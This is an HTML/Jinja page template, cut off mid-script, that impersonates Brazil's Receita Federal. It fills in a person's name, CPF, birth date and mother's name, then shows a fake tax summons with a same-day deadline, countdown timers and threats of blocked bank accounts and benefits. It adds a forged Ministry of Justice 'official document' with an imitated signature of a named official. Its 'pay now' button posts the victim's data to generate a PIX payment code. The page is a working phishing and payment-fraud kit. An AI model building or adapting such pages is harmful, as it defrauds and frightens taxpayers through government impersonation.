<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <title>Receita Federal</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @font-face {
            font-family: 'Rawline';
            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
            font-weight: 400;
            font-style: normal;
        }
        @font-face {
            font-family: 'Rawline';
            src: url("{{ url_for('static', filename='fonts/rawline-400i.1701033bc0b08320.woff2') }}") format('woff2');
            font-weight: 400;
            font-style: italic;
        }
        @font-face {
            font-family: 'Rawline';
            src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
            font-weight: 500;
            font-style: normal;
        }
        @font-face {
            font-family: 'Rawline';
            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
            font-weight: 600;
            font-style: normal;
        }
        @font-face {
            font-family: 'Rawline';
            src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
            font-weight: 700;
            font-style: normal;
        }
        @font-face {
            font-family: 'Rawline';
            src: url("{{ url_for('static', filename='fonts/rawline-800.5c5f78761d00551b.woff2') }}") format('woff2');
            font-weight: 800;
            font-style: normal;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Rawline', sans-serif;
        }

        /* Loading Screen */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .loading-logo {
            width: 120px;
            height: auto;
            margin-bottom: 40px;
        }

        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #f0f0f0;
            border-top: 3px solid #003472;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .loading-text {
            margin-top: 20px;
            font-family: 'Rawline', sans-serif;
            font-size: 16px;
            color: #003472;
            font-weight: 600;
        }

        .main-content {
            display: none;
        }

        .main-content.show {
            display: block;
        }
        body {
            background-color: white;
            padding-top: 60px;
            color: #333333;
            font-size: 16px;
            line-height: 1.05;
        }
        h3, h4 {
            font-size: 18px;
            line-height: 1.05;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 20px;
            background-color: white;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 1000;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            height: 60px;
        }
        .logo {
            width: 240px;
            height: auto;
        }
        .header-icons {
            display: flex;
            gap: 15px;
        }
        .header-icon {
            font-size: 18px;
            color: #0056b3;
        }
        .hero-image {
            width: 100%;
            height: auto;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .hero-image img {
            width: 100%;
            height: auto;
            object-fit: cover;
        }
        .user-info {
            display: flex;
            flex-direction: column;
            position: relative;
            margin: 15px 0;
            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.2);
            background-color: white;
            padding: 15px;
            border-radius: 4px;
            width: 100%;
        }
        .user-info:first-of-type {
            margin-bottom: 30px;
        }
        .user-info-content {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            width: 100%;
        }
        .user-info p {
            margin: 1px 0;
            color: #333333;
            font-size: 16px;
        }
        .user-info p strong {
            font-weight: 600;
        }
        .user-info h3 {
            font-weight: 700;
            color: #0c326f;
            margin-bottom: 4px;
        }
        .user-info-image {
            width: 50px;
            height: auto;
            justify-self: end;
            align-self: start;
            margin-left: 10px;
            filter: drop-shadow(0px 2px 3px rgba(0, 0, 0, 0.2));
        }
        /* Aumentando o espaçamento após os dados do contribuinte */
        .user-info:nth-of-type(2) .user-info-content {
            margin-bottom: 35px;
            padding-bottom: 15px;
        }
        .message-box {
            background-color: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
            padding: 15px;
            margin-top: 15px;
            margin-bottom: 25px;
            border-radius: 4px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
            width: 100%;
        }
        .message-box p {
            margin-bottom: 8px;
            width: 100%;
            font-size: 16px;
            line-height: 1.45;
        }
        .message-box strong {
            font-weight: 700;
        }
        .message-box .red-strong {
            color: #a71d2a;
            font-weight: 700;
        }
        .countdown-timer {
            font-weight: bold;
            color: #ffffff;
            margin-top: 8px;
            background-color: #dc3545;
            padding: 4px 8px;
            border-radius: 4px;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
            width: 100%;
            text-align: center;
        }
        .tax-details {
            margin-top: 25px;
            padding: 15px;
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 4px;
            position: relative;
            overflow: hidden;
        }
        .tax-details::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
            height: 80%;
            background-image: url('https://upload.wikimedia.org/wikipedia/commons/e/e8/Logo_Receita_Federal_do_Brasil.svg');
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
            opacity: 0.05;
            z-index: 0;
        }
        .tax-details > * {
            position: relative;
            z-index: 1;
        }
        .tax-details h4 {
            font-weight: 600;
            margin-bottom: 25px;
            color: #0c326f;
            line-height: 1.45;
        }
        .tax-details .document-data {
            display: grid;
            grid-template-columns: auto 1fr;
            gap: 15px;
            margin-bottom: 25px;
        }
        .tax-details .document-data dt {
            font-weight: 600;
            text-align: right;
            padding: 8px 15px;
            background-color: rgba(248, 249, 250, 0.8);
            border: 1px solid #dee2e6;
            border-radius: 4px;
            min-width: 80px;
            white-space: nowrap;
            overflow-x: auto;
        }
        .tax-details .document-data dd {
            font-weight: normal;
            padding: 8px 15px;
            background-color: rgba(255, 255, 255, 0.8);
            border: 1px solid #dee2e6;
            border-radius: 4px;
            margin-left: 0;
            white-space: nowrap;
            overflow-x: auto;
        }
        .tax-details .document-data dt,
        .tax-details .document-data dd {
            display: flex;
            align-items: center;
        }
        .tax-details .total-value {
            font-size: 20px;
            line-height: 1.45;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 1px solid #dee2e6;
        }
        .regularize-button {
            display: block;
            width: 100%;
            padding: 12px;
            background-color: #28a745;
            color: white;
            text-align: center;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            margin-top: 25px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .news-image {
            width: 100%;
            height: auto;
            margin: 8px auto 0;
            display: block;
            border-radius: 4px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .news-description {
            color: #333;
            margin-top: 12px;
            padding: 0 4px;
            text-align: justify;
            width: 100%;
        }
        .footer {
            background-color: #01205B;
            color: white;
            padding: 16px;
            text-align: center;
            margin-top: 40px;
            width: 100%;
            position: relative;
            bottom: 0;
        }
        .footer-logo {
            width: 100px;
            margin: 0 auto 8px;
            display: block;
        }
        @media (max-width: 600px) {
            .header {
                padding: 6px 8px;
            }
            .logo {
                width: 160px;
            }
            .header-icons {
                gap: 8px;
            }
            .header-icon {
                font-size: 16px;
            }
            .message-box {
                width: 100%;
            }
            .news-image {
                max-width: 100%;
            }
            .news-description {
                margin-left: 0;
            }
        }

        @keyframes pulse {
            0% {
                transform: translate(-50%, -50%) scale(1);
            }
            50% {
                transform: translate(-50%, -50%) scale(1.1);
            }
            100% {
                transform: translate(-50%, -50%) scale(1);
            }
        }

        .sound-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(220, 53, 69, 0.9);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            animation: pulse 1s infinite ease-in-out;
            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
        }

        .video-container {
            position: relative;
            width: 100%;
            margin: 8px auto 0;
            border-radius: 4px;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .news-video {
            width: 100%;
            display: block;
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 2000;
            overflow-y: auto;
            padding: 0;
            margin: 0;
        }

        .modal-content {
            background-color: white;
            width: 100vw;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            border-radius: 0;
            box-shadow: none;
            position: relative;
            overflow-y: auto;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
        }

        .modal-header {
            text-align: center;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid #dee2e6;
        }

        .modal-logo {
            width: 180px;
            height: auto;
            margin: 0 auto;
            display: block;
        }

        /* QR Code Container */
        .qr-code-container {
            display: none;
            text-align: center;
            padding: 15px 0 30px 0;
            flex: 1;
            overflow-y: auto;
        }

        .qr-code-img {
            width: 180px;
            height: 180px;
            margin: 0 auto 15px;
        }

        .customer-info {
            background-color: #f8f9fa;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 12px;
            border-left: 4px solid #0c326f;
            text-align: left;
        }

        .customer-info p {
            margin: 3px 0;
            color: #333;
            text-align: left;
        }

        .customer-info .total-amount {
            color: #dc3545;
            font-weight: 700;
            margin-top: 8px;
            font-size: 16px;
        }

        .warning-text {
            color: white;
            background: linear-gradient(135deg, #dc3545, #c82333);
            border: 2px solid #a71e2a;
            padding: 15px;
            border-radius: 2px;
            margin: 15px 0;
            font-weight: 600;
            text-align: center;
            box-shadow: 0 4px 20px rgba(220, 53, 69, 0.3);
            font-size: 14px;
            line-height: 1.4;
        }

        .countdown-timer-pix {
            background-color: #dc3545;
            color: #fff;
            font-weight: 800;
            padding: 8px;
            border-radius: 4px;
            margin: 0 0 10px 0;
            text-align: center;
            font-size: 18px;
        }

        .pix-code-container {
            background-color: #fff;
            border: 1px solid #dee2e6;
            border-radius: 4px;
            padding: 8px;
            margin: 12px 0;
        }

        .pix-code {
            font-family: monospace;
            word-break: break-all;
            margin: 0;
            padding: 8px;
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 4px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .copy-button-container {
            text-align: center;
            margin: 20px 0 30px 0;
            padding-bottom: 30px;
        }

        .copy-pix-button {
            background-color: #28a745;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            width: 80%;
            justify-content: center;
        }

        .copy-pix-button:hover {
            background-color: #218838;
        }

        /* Ministry Seal Styles */
        .ministry-seal-container {
            text-align: center;
            margin: 20px 0;
            padding: 15px 0;
        }

        .ministry-seal {
            margin-bottom: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .ministry-seal-img {
            width: 60px;
            height: 60px;
            object-fit: contain;
        }

        .ministry-text {
            margin-top: 8px;
        }

        .ministry-name {
            font-size: 14px;
            font-weight: 700;
            color: #333;
            margin: 0 0 4px 0;
            letter-spacing: 0.5px;
        }

        .ministry-gov {
            font-size: 12px;
            font-weight: 600;
            color: #666;
            margin: 0;
            letter-spacing: 0.3px;
        }

        /* Modal no mobile */
        @media (max-width: 600px) {
            .modal {
                width: 100vw;
                height: 100vh;
                padding: 0;
            }

            .modal-content {
                width: 100vw;
                min-height: 100vh;
                padding: 15px;
                box-sizing: border-box;
            }

            .copy-button-container {
                margin: 20px 0 50px 0;
                padding-bottom: 50px;
            }

            .copy-pix-button {
                width: 90%;
                padding: 15px 20px;
                font-size: 16px;
            }
        }

        /* Script JavaScript adicional para o cronômetro */
        @keyframes copy-feedback {
            0% { background-color: #0c326f; }
            50% { background-color: #28a745; }
            100% { background-color: #0c326f; }
        }

        .copy-success {
            animation: copy-feedback 1s ease;
        }

        /* Loader Animation */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loader-container {
            text-align: center;
            padding: 30px 0;
        }

        .loader {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(12, 50, 111, 0.1);
            border-radius: 50%;
            border-top-color: #0c326f;
            animation: spin 1s ease-in-out infinite;
            margin: 0 auto 15px;
        }

        .loader-text {
            color: #0c326f;
            font-weight: 600;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Logo_Receita_Federal_do_Brasil.svg/1194px-Logo_Receita_Federal_do_Brasil.svg.png" alt="Receita Federal" class="loading-logo">
        <div class="loading-spinner"></div>
        <div class="loading-text">Carregando dados...</div>
    </div>

    <!-- Main Content -->
    <div class="main-content" id="mainContent">
        <div class="header">
        <img alt="Logo da Receita Federal" class="logo" src="https://servicos.receitafederal.gov.br/assets/images/receitaAzul.svg"/>
        <div class="header-icons">
            <i class="fas fa-search header-icon"></i>
            <i class="fas fa-question-circle header-icon"></i>
            <i class="fas fa-adjust header-icon"></i>
        </div>
    </div>
    <div class="hero-image">
        <img alt="Aviso sobre novas regras do PIX" src="https://i.ibb.co/cSFXVMXx/Aviso-funcionamento-de-loja-simples-verde-vermelho-story-do-instagram-1080-x-400-px-4.png">
    </div>
    {% if show_confirmation %}
    <div class="user-info">
        <div class="user-info-content">
            <div class="user-info-text">
                <h3>INTIMAÇÃO FISCAL - RECEITA FEDERAL DO BRASIL</h3>
                <p style="text-align: justify; line-height: 1.4;">
                    <strong>{{ customer.nome }}</strong>, portador(a) do CPF <strong>{{ customer.cpf }}</strong>, 
                    em conformidade com o artigo 142 do CTN, informamos que após cruzamento de dados das suas 
                    declarações do Imposto de Renda Pessoa Física do ano de 2020, foi identificada 
                    uma pendência tributária em sua situação fiscal.
                </p>
                <p style="text-align: justify; line-height: 1.4; margin-top: 10px;">
                    <strong style="color: #721c24;">PRAZO FINAL:</strong> {{ customer.today_date }} é o último dia para regularização. 
                    O não cumprimento desta intimação resultará nas seguintes punições conforme 
                    Instrução Normativa RFB nº 1.888/2019:
                </p>
                <ul style="margin: 10px 0; padding-left: 0; line-height: 1.6; list-style: none;">
                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Bloqueio de contas bancárias e cartões</strong></li>
                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Impossibilidade de movimentar PIX, TED e DOC</strong></li>
                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Restrições no Banco Central e SERASA</strong></li>
                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Suspensão do acesso a benefícios federais (Auxílio, Bolsa Família, etc.)</strong></li>
                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Impedimento para financiamentos, empréstimos e compras no crédito</strong></li>
                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Aplicação de multa automática de até 150%</strong></li>
                </ul>
                <p style="margin-top: 12px; font-weight: 600;">
                    Confirme se os dados abaixo correspondem à sua identificação:
                </p>
            </div>
        </div>
        <div style="background-color: #f8f9fa; padding: 15px; border-radius: 4px; margin-top: 10px; border-left: 4px solid #0c326f;">
            <p class="client-name" data-customer-name="{{ customer.nome }}">{{ customer.nome }}</p>
            <p class="client-cpf" data-customer-cpf="{{ customer.cpf }}">CPF: {{ customer.cpf }}</p>
            {% if customer.data_nascimento %}
            {% set date_parts = customer.data_nascimento.split(' ')[0].split('-') if ' ' in customer.data_nascimento else customer.data_nascimento.split('-') %}
            {% if date_parts|length == 3 %}
            <p><strong>Data de Nascimento:</strong> {{ date_parts[2] }}/{{ date_parts[1] }}/{{ date_parts[0] }}</p>
            {% else %}
            <p><strong>Data de Nascimento:</strong> {{ customer.data_nascimento }}</p>
            {% endif %}
            {% endif %}
            {% if customer.nome_mae %}
            <p><strong>Nome da Mãe:</strong> {{ customer.nome_mae }}</p>
            {% endif %}
        </div>
        <div style="margin-top: 20px; text-align: center;">
            <div onclick="confirmData()" style="background: #f8f9fa; border: 2px solid #dee2e6; border-radius: 0px; padding: 20px; max-width: 320px; margin: 0 auto; cursor: pointer; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                <h3 style="margin: 0 0 8px 0; font-size: 14px; font-weight: bold; letter-spacing: 1px; color: #000;">
                    MINISTÉRIO DA JUSTIÇA
                </h3>
                <h4 style="margin: 0 0 15px 0; font-size: 12px; font-weight: bold; letter-spacing: 0.5px; color: #000;">DOCUMENTO OFICIAL</h4>
                <div style="width: 70px; height: 70px; margin: 0 auto 12px; display: flex; align-items: center; justify-content: center;">
                    <img src="https://dspace.mj.gov.br/retrieve/95d2f9b3-76eb-4f34-96a4-c2cd54ac589a" alt="Brasão do Ministério da Justiça" style="width: 60px; height: 60px; object-fit: contain;">
                </div>
                <p style="margin: 8px 0; font-size: 13px; line-height: 1.4; color: #333; text-align: justify;">
                    Este documento foi assinado em <strong>{{ customer.today_date }}</strong> e possui 
                    permissão do Ministério da Justiça para fazer cumprir todos os bloqueios e restrições 
                    supracitados em face de <strong>{{ customer.nome }}</strong>, portador do CPF nº <strong>{{ customer.cpf }}</strong>, 
                    conforme legislação vigente.
                </p>
                <div style="margin: 15px auto; padding: 12px; max-width: 280px;">
                    <p style="margin: 0 0 8px 0; font-size: 12px; font-weight: 600; color: #666;">
                        Secretário Especial da Receita Federal
                    </p>
                    <p style="margin: 0; font-size: 18px; font-family: 'Brush Script MT', cursive, 'Lucida Handwriting', 'Apple Chancery', fantasy; color: #000; font-weight: normal; font-style: italic;">
                        Robinson Sakiyama Barreirinhas
                    </p>
                    <div style="width: 200px; height: 1px; background-color: #333; margin: 3px auto 0; opacity: 0.6;"></div>
                </div>
            </div>
        </div>
    </div>
    {% else %}
    <div class="user-info">
        <div class="user-info-content">
            <div class="user-info-text">
                <h3>Notícia na mídia</h3>
                <p><strong>Programa:</strong> Jornal da Band</p>
                <p><strong>Data:</strong> 05 de março de 2025</p>
            </div>
        </div>
        <div class="video-container">
            <video id="newsVideo" class="news-video" autoplay muted playsinline webkit-playsinline>
                <source src="{{ url_for('static', filename='videos/news.mp4') }}" type="video/mp4">
                Seu navegador não suporta o elemento de vídeo.
            </video>
            <button id="soundButton" class="sound-button">
                <i class="fas fa-volume-up"></i>
                <span>CLIQUE PARA OUVIR!</span>
            </button>
        </div>
        <p class="news-description" id="newsDescription"></p>
    </div>
    {% endif %}
    <div class="user-info">
            <div class="user-info-content">
                <div class="user-info-text">
                    <h3>DADOS DO DEVEDOR</h3>
                    <p><strong>NOME:</strong> {{ customer.nome.upper() }}</p>
                    <p><strong>CPF:</strong> <strong>{{ customer.cpf }}</strong></p>
                </div>
                <img src="https://i.ibb.co/xKfzBFbn/download-1.png" alt="User profile icon" class="user-info-image">
            </div>
            <div class="message-box">
                <p><span class="red-strong">Atenção {{ customer.nome.split()[0] }}:</span> A Receita Federal identificou inconsistências nas suas declarações do Imposto de Renda do exercício de <strong>2020.</strong> O prazo para regularização <span class="red-strong">acaba hoje</span>. Caso não seja regularizado no prazo estabelecido, o contribuinte estará sujeito a todas as penalidades e restrições supracitadas neste documento.</p>
                <div class="countdown-timer" id="countdown">Tempo restante: 23h 40m 52s</div>
            </div>
            <div class="tax-details">
                <h4>Análise Fiscal Completa - Débitos Identificados:</h4>
                
                {% if customer.tax_analysis %}
                <div style="background-color: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0; border-left: 4px solid #dc3545;">
                    <p style="margin: 0 0 8px 0; font-weight: 600; color: #721c24;">
                        <i class="fas fa-exclamation-triangle" style="color: #dc3545; margin-right: 8px;"></i>
                        Situação: {{ customer.tax_analysis.situacao }}
                    </p>
                    <p style="margin: 0; font-size: 14px; color: #495057;">
                        Análise realizada em: {{ customer.tax_analysis.data_analise }}
                    </p>
                </div>
                
                <div style="margin: 20px 0;">
                    <h5 style="color: #721c24; margin-bottom: 15px; font-size: 16px;">
                        <i class="fas fa-calendar-alt" style="margin-right: 8px;"></i>
                        Débitos por Exercício Fiscal:
                    </h5>
                    
                    {% for ano_data in customer.tax_analysis.anos %}
                    <div style="background: #fff; border: 1px solid #dee2e6; border-radius: 6px; margin-bottom: 12px; overflow: hidden;">
                        <div style="background: linear-gradient(135deg, #003472, #0056b3); color: white; padding: 10px 15px; font-weight: 600;">
                            <i class="fas fa-file-alt" style="margin-right: 8px;"></i>
                            Exercício {{ ano_data.ano }} - Status: {{ ano_data.status }}
                        </div>
                        <div style="padding: 15px;">
                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 12px;">
                                <div>
                                    <strong>Valor Principal:</strong><br>
                                    <span style="color: #dc3545;">R$ {{ "%.2f"|format(ano_data.valor_principal) }}</span>
                                </div>
                                <div>
                                    <strong>Multas:</strong><br>
                                    <span style="color: #dc3545;">R$ {{ "%.2f"|format(ano_data.multa) }}</span>
                                </div>
                                <div>
                                    <strong>Juros de Mora:</strong><br>
                                    <span style="color: #dc3545;">R$ {{ "%.2f"|format(ano_data.juros) }}</span>
                                </div>
                                <div>
                                    <strong>Total do Ano:</strong><br>
                                    <span style="color: #dc3545; font-weight: 700; font-size: 16px;">R$ {{ "%.2f"|format(ano_data.total_ano) }}</span>
                                </div>
                            </div>
                            
                            {% if ano_data.detalhes %}
                            <div style="border-top: 1px solid #dee2e6; padding-top: 12px; margin-top: 12px;">
                                <strong style="font-size: 14px; color: #495057;">Detalhamento:</strong>
                                <ul style="margin: 8px 0 0 0; padding-left: 20px;">
                                    {% for detalhe in ano_data.detalhes %}
                                    <li style="margin-bottom: 4px; font-size: 14px;">
                                        <strong>{{ detalhe.tipo }}:</strong> {{ detalhe.descricao }} - 
                                        <span style="color: #dc3545;">R$ {{ "%.2f"|format(detalhe.valor) }}</span>
                                        <span style="color: #6c757d;">(Venc: {{ detalhe.vencimento }})</span>
                                    </li>
                                    {% endfor %}
                                </ul>
                            </div>
                            {% endif %}
                        </div>
                    </div>
                    {% endfor %}
                </div>
                
                <div style="background: linear-gradient(135deg, #dc3545, #c82333); color: white; padding: 20px; border-radius: 8px; text-align: center; margin: 20px 0;">
                    <h4 style="margin: 0 0 10px 0; font-size: 20px;">
                        <i class="fas fa-exclamation-circle" style="margin-right: 10px;"></i>
                        TOTAL GERAL DEVIDO
                    </h4>
                    <p style="margin: 0; font-size: 24px; font-weight: 800;">
                        R$ {{ "%.2f"|format(customer.tax_analysis.total_devido) }}
                    </p>
                </div>
                
                {% else %}
                <dl class="document-data">
                    <dt>Nome:</dt>
                    <dd>{{ customer.nome.upper() }}</dd>
                    <dt>CPF:</dt>
                    <dd>{{ customer.cpf }}</dd>
                    <dt>2020:</dt>
                    <dd>R$ 127,94</dd>
                </dl>
                <p class="total-value"><strong>Total devido: R$ 127,94</strong></p>
                {% endif %}
                
                <p style="margin: 15px 0; padding: 15px; background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 6px; color: #856404;">
                    <i class="fas fa-info-circle" style="margin-right: 8px;"></i>
                    Para regularizar a situação fiscal e evitar a aplicação das penalidades previstas no documento oficial, é obrigatório efetuar o pagamento das divergências calculadas pela Receita Federal no valor total de <strong style="color: #dc3545;">R$ {{ "%.2f"|format(customer.tax_analysis.total_devido if customer.tax_analysis else 127.94) }}</strong>.
                </p>
                <button class="regularize-button">
                    <i class="fas fa-credit-card" style="margin-right: 8px;"></i>
                    Regularizar agora
                </button>
            </div>
        </div>
    <footer class="footer">
        <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" alt="Receita Federal Logo" class="footer-logo">
        <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
    </footer>
    <script src="{{ url_for('static', filename='js/countdown.js') }}"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const video = document.getElementById('newsVideo');
            const soundButton = document.getElementById('soundButton');

            // Only add video event listeners if video and sound button exist
            if (video && soundButton) {
                video.addEventListener('click', function() {
                    if (video.paused) {
                        video.play();
                        if (video.muted) {
                            soundButton.style.display = 'flex';
                        }
                    } else {
                        video.pause();
                        soundButton.style.display = 'flex';
                    }
                });

                soundButton.addEventListener('click', function() {
                    video.currentTime = 0;
                    video.muted = false;
                    video.play();
                    soundButton.style.display = 'none';
                });

                video.addEventListener('ended', function() {
                    video.pause();
                    video.muted = true;
                    soundButton.style.display = 'flex';
                });
            }
        });


        async function generatePayment() {
            const modal = document.getElementById('paymentModal');
            const loaderContainer = document.getElementById('loaderContainer');
            const qrCodeContainer = document.getElementById('qrCodeContainer');

            try {
                modal.style.display = 'block';
                loaderContainer.style.display = 'block';
                qrCodeContainer.style.display = 'none';

                const cpfValue = '{{ customer.cpf }}';
                const nameValue = '{{ customer.nome }}';
                const emailValue = 'gerarpagamento@gmail.com';

                const pixData = {
                    cpf: cpfValue,
                    name: nameValue,
                    email: emailValue
                };

                console.log('Enviando dados PIX:', pixData);

                const response = await fetch('/generate-pix', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(pixData)
                });

                console.log('Status da resposta:', response.status);
                const data = await response.json();
                console.log('Resposta do PIX:', data);

                if (data.success) {
                    // Extrair dados da resposta
                    const pixCode = data.pix_code || data.pixCode || '';

                    // Mostrar código PIX no textarea
                    document.getElementById('pixCode').value = pixCode;

                    loaderContainer.style.display = 'none';
                    qrCodeContainer.style.display = 'block';
                    startPixCountdown();
                } else {
                    throw new Error(data.error || 'Erro ao gerar o pagamento');
                }

            } catch (error) {
                console.error('Erro:', error);

                loaderContainer.style.display = 'none';
                alert('Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente em alguns instantes.');
                setTimeout(() => {
                    modal.style.display = 'none';
                }, 1500);
            }
        }

        function copyPixCode() {
            const pixCodeElement = document.getElementById('pixCode');
            const pixCode = pixCodeElement.value || pixCodeElement.textContent || '';
            const copyButton = document.querySelector('.copy-pix-button');

            if (!pixCode) {
                console.error('Código PIX não encontrado');
                alert('Código PIX não disponível para copiar');
                return;
            }

            console.log('Copiando código PIX:', pixCode.substring(0, 50) + '...');

            navigator.clipboard.writeText(pixCode).then(() => {
                copyButton.classList.add('copy-success');
                copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
                setTimeout(() => {
                    copyButton.classList.remove('copy-success');
                    copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar Código PIX';
                }, 2000);
            }).catch(err => {
                console.error('Erro ao copiar:', err);
                // Fallback para navegadores que não suportam clipboard API
                try {
                    pixCodeElement.select();
                    document.execCommand('copy');
                    copyButton.classList.add('copy-success');
                    copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
                    setTimeout(() => {
                        copyButton.classList.remove('copy-success');
                        copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar Código PIX';
                    }, 2000);
                } catch (fallbackErr) {
                    console.error('Fallback copy failed:', fallbackErr);
                    alert('Não foi possível copiar automaticamente. Selecione e copie manualmente.');
                }
            });
        }

        function startPixCountdown() {
            let minutes = 10;
            let seconds = 0;
            const countdownElement = document.getElementById('pixCountdown');

            if (!countdownElement) {
                console.error('Elemento pixCountdown não encontrado');
                return;
            }

            const countdown = setInterval(() => {
                if (seconds === 0) {
                    if (minutes === 0) {
                        clearInterval(countdown);
                        countdownElement.textContent = '00:00';
                        return;
                    }
                    minutes--;
                    seconds = 59;
                } else {
                    seconds--;
                }

                const minutesStr = minutes.toString().padStart(2, '0');
                const secondsStr = seconds.toString().padStart(2, '0');
                countdownElement.textContent = `${minutesStr}:${secondsStr}`;
            }, 1000);
        }

        // Adicionar evento de clique no botão "Regularizar agora"
        document.addEventListener('DOMContentLoaded', function() {
            const regularizeButton = document.querySelector('.regularize-button');
            if (regularizeButton) {
                regularizeButton.addEventListener('click', function(e) {
                    e.preventDefault();
                    console.log('Botão Regularizar agora clicado');
                    generatePayment();
                });
            } else {
                console.error('Botão regularizar não encontrado');
            }
        });

        // Fechar modal ao clicar fora
        window.onclick = function(event) {
            const modal = document.getElementById('paymentModal');
            if (event.target == modal) {
                modal.style.display = 'none';
            }
        }

        // Função para confirmar os dados do usuário
        function confirmData() {
            console.log('Confirmando dados do usuário e iniciando análise fiscal...');
            
            // Esconder a seção de tax-details inicialmente
            const taxDetails = document.querySelector('.tax-details');
            if (taxDetails) {
                taxDetails.style.display = 'none';
            }
            
            // Criar e mostrar loading de análise fiscal
            showFiscalAnalysisLoading();
            
            // Scroll para baixo para mostrar as informações de débito
            const debtorInfo = document.querySelector('.user-info:nth-of-type(2)');
            if (debtorInfo) {
                debtorInfo.scrollIntoView({ behavior: 'smooth', block: 'start' });
            }
        }

        function showFiscalAnalysisLoading() {
            console.log('Iniciando análise fiscal...');
            
            // Encontrar a segunda user-info (a que contém DADOS DO DEVEDOR)
            const userInfos = document.querySelectorAll('.user-info');
            const debtorInfo = userInfos[userInfos.length - 1]; // A última user-info
            
            if (!debtorInfo) {
                console.error('Não foi possível encontrar a seção de dados do devedor');
                return;
            }
            
            // Criar container de loading fiscal
            const loadingContainer = document.createElement('div');
            loadingContainer.id = 'fiscalAnalysisLoading';
